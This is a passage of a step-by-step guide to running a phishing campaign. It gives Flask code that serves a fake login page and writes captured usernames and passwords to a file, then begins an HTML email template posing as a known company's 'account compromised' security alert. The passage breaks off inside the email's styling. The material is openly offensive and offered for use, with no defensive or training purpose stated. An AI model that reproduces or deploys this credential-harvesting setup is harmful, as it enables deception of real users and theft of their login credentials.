### Step-by-Step Guide

1. **Set Up the Flask App**

   Create a new Flask application to serve the phishing page and handle form submissions.

   ```python
   from flask import Flask, request, render_template
   from smtplib import SMTP

   app = Flask(__file__)

   @app.route('/')
   def landing_page():
       return render_template('phishing.html')

   @app.route('/success', methods=['POST'])
   def handle_login():
       username = request.form['username']
       password = request.form['password']
       # Log the captured credentials
       with open('phishing_data.txt', 'a') as f:
           f.write(f"Username: {username}\nPassword: {password}\n\n")
       return render_template('success.html')

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=5000)
   ```

2. **Create the Phishing Email**

   Design an email template that appears legitimate, typically from a known company.

   ```html
   <!DOCTYPE html>
   <html>
   <head>
       <title>Security Alert: Your Account Has Been Compromised</title>
       <style>
           body {
               font-family: Arial, sans-serif;
               line-height: 1.6;
               color: #333;
           }
           .container {
               max-width: 600px;
               margin: 20px auto;
               padding: 20px;
               background-color: #f5f5f5;
           }
           .logo {
               text-align: center;
               margin-bottom: 20px;
           }
           .content {
               padding: 20px;
           }
